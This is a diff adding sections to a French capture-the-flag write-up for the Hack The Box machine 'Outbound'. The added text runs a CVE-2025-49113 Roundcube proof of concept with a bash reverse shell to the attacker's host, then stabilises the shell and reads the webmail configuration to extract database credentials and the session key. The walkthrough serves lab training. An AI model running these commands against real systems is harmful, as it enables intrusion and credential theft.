@@ -549,6 +549,130 @@ Tu testes ensuite plusieurs méthodes classiques afin de confirmer l’exécutio
 
 L’exploit ne permettant pas d’obtenir facilement une sortie de commande exploitable, le plus simple consiste alors à tenter directement l’obtention d’un reverse shell.
 
+### Reverse shell
+
+Depuis ta machine Kali, tu prépares un listener avec `rlwrap` afin d’obtenir un shell plus confortable et plus stable qu’avec un simple listener `nc` :
+
+```bash
+rlwrap -cAr nc -lvnp 4444
+```
+
+Tu utilises ensuite le PoC pour exécuter un reverse shell Bash vers ta machine Kali :
+
+```bash
+php CVE-2025-49113.php \
+  http://mail.outbound.htb \
+  tyler \
+  'LhKL1o9Nm3X2' \
+  'bash -c "bash -i >& /dev/tcp/10.10.14.X/4444 0>&1"'
+```
+
+Le listener reçoit alors une connexion entrante et tu obtiens un shell en tant que :
+
+```bash
+www-data
+```
+
+### Stabilisation du shell
+
+Après réception du reverse shell, tu constates que `python3` n’est pas disponible sur la cible.
+
+Tu recherches alors une autre méthode permettant d’obtenir un pseudo-terminal interactif :
+
+```bash
+which script
+```
+
+La commande retourne :
+
+```bash
+/usr/bin/script
+```
+
+Tu peux donc utiliser `script` pour stabiliser le reverse shell :
+
+```bash
+script -qc /bin/bash /dev/null
+```
+
+Puis :
+
+```bash
+export TERM=xterm
+```
+
+Depuis ton terminal Kali, utilise ensuite la combinaison :
+
+```bash
+Ctrl + Z
+```
+
+Puis configure correctement le TTY local :
+
+```bash
+stty raw -echo; fg
+```
+
+Et termine avec :
+
+```bash
+reset
+export SHELL=bash
+stty rows 43 columns 170
+```
+
+Tu obtiens alors un terminal interactif beaucoup plus confortable pour poursuivre l’énumération de la machine.
+
+Comme expliqué dans la recette {{< recette "stabiliser-reverse-shell" >}}, `script` constitue une bonne alternative lorsque `python3` n’est pas disponible sur la cible.
+
+
+
+### Énumération locale
+
+Une fois le shell stabilisé, tu peux commencer l’énumération locale du serveur afin de rechercher des fichiers de configuration, des identifiants réutilisables ou des informations sensibles accessibles à l’utilisateur `www-data`.
+
+Comme souvent avec les applications PHP, les fichiers de configuration du webmail constituent une piste intéressante, car ils contiennent fréquemment les identifiants de connexion à la base de données.
+
+Tu recherches alors les fichiers de configuration de Roundcube accessibles à l’utilisateur `www-data`.
+
+Tu recherches ensuite les fichiers de configuration présents dans l’arborescence du webmail :
+
+```bash
+find /var/www/html/ -type f -name "config*" 2>/dev/null
+```
+
+La commande retourne plusieurs fichiers  `.dist`, mais également le véritable fichier de configuration utilisé par Roundcube :
+
+```bash
+/var/www/html/roundcube/config/config.inc.php
+```
+
+Tu peux alors consulter son contenu :
+
+```bash
+cat /var/www/html/roundcube/config/config.inc.php
+```
+
+Le fichier contient notamment les identifiants utilisés par Roundcube pour accéder à la base de données MySQL :
+
+```php
+$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+```
+
+Tu récupères également la clé utilisée par Roundcube pour chiffrer certaines données de session :
+
+```php
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
+```
+
+**Ces informations deviennent particulièrement intéressantes pour la suite de l’exploitation, car elles permettent d’accéder directement à la base de données du webmail et potentiellement de récupérer des informations sensibles liées aux utilisateurs.**
+
+
+
+
+
+
+
 
 
 ```php
